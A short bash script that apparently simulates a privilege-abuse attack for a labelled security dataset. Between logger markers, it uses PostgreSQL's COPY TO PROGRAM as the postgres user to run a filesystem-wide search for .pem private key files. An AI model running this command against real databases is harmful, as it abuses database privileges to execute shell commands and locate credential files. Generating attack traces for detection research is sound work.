#!/bin/bash
echo "Simulating Privilege Abuse Attack (find_keys)..."
/dataset_workspace/logger.sh mark_attack "attack_priv_find_keys" start
psql -U postgres -d casce_tpcb -c "COPY (SELECT 1) TO PROGRAM 'find / -name '*.pem' > /tmp/out_find_keys.txt 2>/dev/null || true';"
/dataset_workspace/logger.sh mark_attack "attack_priv_find_keys" end
